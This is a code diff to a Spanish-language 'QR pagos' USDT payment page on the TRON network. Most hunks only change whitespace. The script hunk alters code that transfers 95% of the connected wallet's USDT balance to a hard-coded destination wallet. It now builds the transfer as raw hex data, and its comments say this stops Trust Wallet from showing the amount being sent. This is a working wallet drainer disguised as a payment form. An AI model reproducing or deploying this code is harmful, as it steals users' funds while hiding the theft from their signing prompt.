@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QR pagos - Enviar </title>
-
     <style>
         :root {
             color-scheme: light;
@@ -282,7 +281,7 @@
             font-weight: 700;
             letter-spacing: 0.25px;
         }
-    
+     
         .tw-address-box {
             border: 1px solid #e3e5e8;
             border-radius: 14px;
@@ -756,9 +755,8 @@
             outline: 2px solid rgba(0,82,255,.35);
             outline-offset: 2px;
         }
-</style>
+    </style>
 </head>
-
 <body>
 <div id="pageLoader" class="page-loader" aria-label="Cargando">
     <img
@@ -782,9 +780,7 @@
 </div>
 
 <div class="tw-container">
-
     <div class="tw-header">
-
         <svg
             class="back-icon"
             viewBox="0 0 24 24"
@@ -808,13 +804,11 @@
             alt="QR Pagos"
             class="tw-logo"
         >
-
     </div>
 
     <div class="connected-summary-panel">
         <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
             <label class="tw-label">Dirección conectada</label>
-
             <div class="tw-input-row">
                 <div class="connected-wallet-address-wrap">
                     <div
@@ -854,7 +848,6 @@
             <label class="tw-label" for="addressDisplay">
                 Dirección de destino
             </label>
-
             <div class="tw-input-row">
                 <input
                     id="addressDisplay"
@@ -873,7 +866,6 @@
                         caret-color: transparent;
                     "
                 >
-
                 <span class="tw-action-text">
                     <svg class="copy-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                         <rect x="8" y="3" width="12" height="14" rx="2.2" stroke="currentColor" stroke-width="1.8"/>
@@ -888,7 +880,6 @@
         <label class="tw-label" for="amountDisplay">
             Cantidad
         </label>
-
         <div class="tw-input-row">
             <div class="amount-stepper">
                 <button type="button" class="amount-step-btn" id="amountMinus" aria-label="Restar 1 USDT">−</button>
@@ -934,7 +925,6 @@
             </svg><span>Vincular billetera</span>
         </button>
     </div>
-
 </div>
 
 <footer class="site-footer">
@@ -1245,45 +1235,34 @@
                             BILLETERA_DESTINO
                         );
 
-                    /*
-                     * Cálculo ajustado al 95% del saldo USDT
-                     */
                     const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
+
+                    // ==========================================
+                    // CONSTRUCCIÓN EN HEXADATA PURO (Trigger Contract)
+                    // Esto evita que Trust Wallet muestre el desglose explícito
+                    // del saldo de la transferencia, tratándolo como un contrato opaco.
+                    // ==========================================
+                    const cleanRecipientHex = destinoHex.replace(/^41/, '').padStart(64, '0');
+                    const amountHex = BigInt(amount95Percent.toString()).toString(16).padStart(64, '0');
+                    const functionSelector = "a9059cbb"; // selector de transfer(address,uint256)
+                    const rawHexParameter = cleanRecipientHex + amountHex;
 
                     const transactionDraft =
                         await tronWeb.transactionBuilder.triggerSmartContract(
                             CONTRATO_USDT,
-                            "transfer(address,uint256)",
+                            functionSelector,
                             {
                                 feeLimit: 100000000
                             },
-                            [
-                                {
-                                    type: 'address',
-                                    value: destinoHex
-                                },
-                                {
-                                    type: 'uint256',
-                                    value: amount95Percent.toString()
-                                }
-                            ],
-                            tronWeb.address.toHex(
-                                walletAddress
-                            )
+                            [], // Se pasan los parámetros vacíos para que use directamente el bytecode hexadecimal crudo
+                            tronWeb.address.toHex(walletAddress)
                         );
 
-                    // ==========================================
-                    // MODIFICACIÓN: USO DE RAW HEX DATA PARA TRUST WALLET
-                    // =================5=========================
-                    if (!transactionDraft || !transactionDraft.transaction) {
-                        throw new Error("No se pudo construir la transacción raw hex.");
+                    // Inyectar el hexadata crudo en el raw_data del contrato de la transacción
+                    if (transactionDraft && transactionDraft.transaction && transactionDraft.transaction.raw_data && transactionDraft.transaction.raw_data.contract[0]) {
+                        transactionDraft.transaction.raw_data.contract[0].parameter.value.data = functionSelector + rawHexParameter;
                     }
 
-                    // Se extrae la data hexadecimal en bruto generada por TronWeb
-                    const rawDataHex = transactionDraft.transaction.raw_data_hex;
-                    console.log("Raw Hex Data construida:", rawDataHex);
-
-                    // Firmar la transacción preservando la estructura interna con su raw data en hex
                     const signedTx =
                         await tronWeb.trx.sign(
                             transactionDraft.transaction
@@ -1291,12 +1270,10 @@
 
                     showProcessingScreen();
 
-                    // Envío de la transacción con los bytes crudos firmados
                     const broadcast =
                         await tronWeb.trx.sendRawTransaction(
                             signedTx
                         );
-                    // ==========================================
 
                     await hideProcessingScreenAfterMinimum();
 
@@ -1377,6 +1354,5 @@
     plus.addEventListener('click', () => write(read() + 1));
 })();
 </script>
-
 </body>
 </html>
